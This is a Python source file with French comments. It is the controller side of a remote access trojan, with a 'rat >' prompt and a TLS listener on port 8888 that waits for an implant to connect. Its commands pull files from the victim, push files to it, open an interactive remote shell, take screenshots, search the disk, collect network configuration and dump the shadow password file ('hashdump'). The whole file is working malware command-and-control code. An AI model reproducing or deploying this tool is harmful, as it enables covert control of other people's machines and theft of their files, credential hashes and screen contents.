from fileinput import filename
import socket
import ssl
import os
import subprocess
from dotenv import load_dotenv

SERVER_PORT = 8888

# Fonction permettant de récupérer la liste des commandes disponibles
def menu_help(client_socket):

    client_socket.send(b'help')  # Envoie de la commande
    menu_help_received = client_socket.recv(4096).decode()  # Réception du menu d'aides
    print(f'{menu_help_received}')# Affichage du menu d'aides

# Fonction permettant de télécharger un fichier du client
def download(client_socket):
    client_socket.send(b'download')  # Envoi de la commande download

    fichier_to_send = input("[?] Entrez le chemin exact du fichier à télécharger depuis le client : ")  # Saisie du chemin du fichier à télécharger
    client_socket.send(fichier_to_send.encode())  # Envoi du chemin du fichier au client

    with open(os.path.basename(fichier_to_send), 'wb') as file:  # Ouverture du fichier local avec le même nom que sur le client
        while True:
            fichier_received = client_socket.recv(4096)  # Réception des données du fichier
            if fichier_received.endswith(b'END'):
                file.write(fichier_received[:-3])
                break
            file.write(fichier_received)
    
    print(f"[+] Le fichier '{os.path.basename(fichier_to_send)}' a été téléchargé avec succès.")



# Fonction permettant de charger un fichier du serveur vers le client
def upload(client_socket):
    client_socket.send(b'upload') #Envoi de la commande upload
    while True:
        filename = input("[?] Entrez le nom du fichier à envoyer : ") # Récupération saisie du nom du fichier
        if filename.strip() == "": # Check si l'input est vide
            print("[!] Le nom du fichier ne peut pas être vide !")
        else:
            break
    try:
        client_socket.send(filename.encode()) #Envoi du nom du fichier
        with open(filename, 'rb') as f: # Ouverture/lecture du fichier
            while True:
                chunk = f.read(4096)
                if not chunk : 
                    break
                client_socket.sendall(chunk) # Envoi du fichier
        client_socket.send(b'END')  # Envoi d'un délimiteur final
    except Exception as e:
        print(f"Erreur lors de l'envoi du fichier {filename} : {str(e)}")

# Fonction permettant d'initier un shell intéractif sur le client
def shell(client_socket, client_ip):
    client_socket.send(b'shell')  # Envoie de la commande
    repertoire_actuel = client_socket.recv(4096).decode()
    print(f'\n{repertoire_actuel}')
    print("\n[*] Taper 'quit' pour quitter le Shell\n")
    while True:
        commande_shell = input(f"[{client_ip}] Shell > ")  # Récupération de la commande Shell saisie
        if commande_shell.lower() == 'quit':  # Gestion de la sortie du Shell
            client_socket.send(b'quit')
            break
        elif commande_shell.lower() == 'help':
            client_socket.send(b'help')
        else:
            client_socket.send(commande_shell.encode())  # Envoie de la commande Shell au client
        commande_shell_received = client_socket.recv(4096).decode()  # Récupération de la réponse de la commande Shell
        print(f'\n{commande_shell_received}')  # Affichage de la réponse de la commande Shell

# Fonction permettant de récupérer la configuration réseau du client
def ipconfig(client_socket):
    client_socket.send(b'ipconfig')  # Envoie de la commande
    conf_received = client_socket.recv(4096).decode()  # Récupération des données de la configuration
    print(f'\n{conf_received}')  # Affichage de la configuration

# Fonction permettant de récupérer la capture d'écran du client
def screenshot(client_socket, nb_screenshot):
    client_socket.send(b'screenshot')  # Envoie de la commande
    screenshot_name = f'screenshot{nb_screenshot}.png'
    with open(screenshot_name, 'wb') as screenshot:  # Ouverture du fichier créé
        while True:
            screenshot_received = client_socket.recv(4096)  # Récupération des données de la capture d'écran
            if screenshot_received.endswith(b'END'):  # Vérification du délimiteur final
                screenshot.write(screenshot_received[:-3])  # Ecriture des données reçues dans le fichier ouvert sans le délimiteur
                break
            screenshot.write(screenshot_received)  # Ecriture des données reçues dans le fichier ouvert
    print(f'[+] {screenshot_name} reçu')
    return nb_screenshot + 1  # Incrémentation du nombre de capture d'écran

# Fonction permettant de chercher un fichier sur la machine du client
def search(client_socket) :
    while True:
        recherche_to_send = input("[?] Entrez le nom du fichier recherché : ") # Récupération du nom du fichier recherché
        if recherche_to_send.strip() == "":
            print("[!] Le nom du fichier ne peut pas être vide.")
        else:
            break
    client_socket.send(b'search') # Envoie de la commande
    client_socket.send(recherche_to_send.encode()) # Envoie du nom du fichier à rechercher
    recherche_received = client_socket.recv(4096).decode() # Récupération des résultats de la recherche
    print(f'\n{recherche_received}\n') # Affichage des résultats de la recherche

# Fonction permettant de récupérer le fichier shadow du client
def hashdump(client_socket):
    client_socket.send(b'hashdump')  # Envoie de la commande
    hashdump_received = client_socket.recv(4096).decode()  # Récupération des données hashdump
    print(f'\n{hashdump_received}')  # Affichage des données hashdump

def main():
    # Récupération et définition des variables
    load_dotenv()
    ip_server = os.getenv('IP_SERVER')
    nb_screenshot = 1
    cert = './cert.pem'
    key = './key.pem'

    # Création du contexte SSL pour l'authentification client
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=cert, keyfile=key)

    # Création du socket TCP pour la connexion au serveur
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip_server, SERVER_PORT))  # Définition de l'adresse et du port d'écoute du serveur
    server_socket.listen(1)  # Mise en écoute du socket

    print(f"[*] Listening on {SERVER_PORT}...")

    # Enveloppement du socket avec SSL pour sécuriser la communication
    with context.wrap_socket(server_socket, server_side=True) as ssl_socket:
        # Attente d'une connexion entrante et acceptation de celle-ci
        client_socket, client_address = ssl_socket.accept()
        client_ip, client_port = client_socket.getpeername()  # Récupération de l'adresse IP du client
        print("[+] Agent received!")

        # Gestion des commandes envoyées au client
        while True:
            command = input("rat > ")
            if command.lower() == 'help':
                menu_help(client_socket)
            elif command.lower() == 'download':
                download(client_socket)
            elif command.lower() == 'upload':
                upload(client_socket)
            elif command.lower() == 'shell':
                shell(client_socket, client_ip)
            elif command.lower() == 'ipconfig':
                ipconfig(client_socket)
            elif command.lower() == 'screenshot':
                nb_screenshot = screenshot(client_socket, nb_screenshot)
            elif command.lower() == 'search':
                search(client_socket)
            elif command.lower() == 'hashdump':
                hashdump(client_socket)
            elif command.lower() == 'exit':
                client_socket.send(b'exit')
                break
            else:
                print("[!] Commande non reconnue")  # Gestion des saisies utilisateur
                print("[*] Taper 'help' pour voir la liste des commandes disponibles")

        client_socket.close()  # Fermeture du socket client
    server_socket.close()  # Fermeture du socket serveur

if __name__ == "__main__":
    main()
